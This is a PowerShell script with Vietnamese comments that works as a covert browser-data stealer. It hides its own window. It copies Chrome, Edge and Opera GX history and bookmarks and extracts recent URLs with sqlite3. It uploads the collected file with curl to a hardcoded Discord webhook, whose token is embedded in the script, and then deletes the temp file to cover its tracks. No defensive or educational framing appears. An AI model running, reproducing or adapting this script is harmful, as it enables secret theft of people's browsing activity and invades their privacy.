param(
    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe",
    [string]$hide = 'y' # Mặc định cho ẩn luôn để không hiện cửa sổ
)

# 1. Cơ chế ẩn cửa sổ (Stealth Mode)
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }
}

# 2. Thiết lập Webhook & File tạm
$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
$whuri = "https://discord.com/api/webhooks/$dc"
$outpath = "$env:TEMP\browser_history.txt"
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

"Browser History Report | $(Get-Date)" | Out-File -FilePath $outpath -Encoding UTF8

# 3. Đường dẫn dữ liệu (Sửa lỗi dấu ngoặc và biến)
$Paths = @{
    'chrome_history'   = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'     = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'edge_bookmarks'   = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'opera_history'    = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'  = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}

$Browsers = @('chrome', 'edge', 'opera')
$DataTypes = @('history', 'bookmarks')

# 4. Quá trình thu thập
foreach ($Browser in $Browsers) {
    foreach ($Type in $DataTypes) {
        $Key = "${Browser}_${Type}"
        $Path = $Paths[$Key]

        if (Test-Path $Path) {
            try {
                if ($Type -eq 'history') {
                    $copyPath = "$env:TEMP\${Browser}_h"
                    Copy-Item $Path $copyPath -Force -ErrorAction SilentlyContinue
                    
                    if (Test-Path $sqlitePath) {
                        # Query sqlite3
                        $data = & $sqlitePath $copyPath "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 15;"
                        $data | ForEach-Object { "$Browser [History] | $_" | Out-File $outpath -Append -Encoding UTF8 }
                    }
                    Remove-Item $copyPath -Force -ErrorAction SilentlyContinue
                } else {
                    $Value = Get-Content -Path $Path -Raw -ErrorAction SilentlyContinue | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique
                    $Value | ForEach-Object { "$Browser [Bookmark] | $_" | Out-File $outpath -Append -Encoding UTF8 }
                }
            } catch { continue }
        }
    }
}

# 5. Gửi lên Discord và tự hủy file tạm
if (Test-Path $outpath) {
    curl.exe -F "file=@$outpath" $whuri | Out-Null
    Start-Sleep -Seconds 1
    Remove-Item $outpath -Force
}
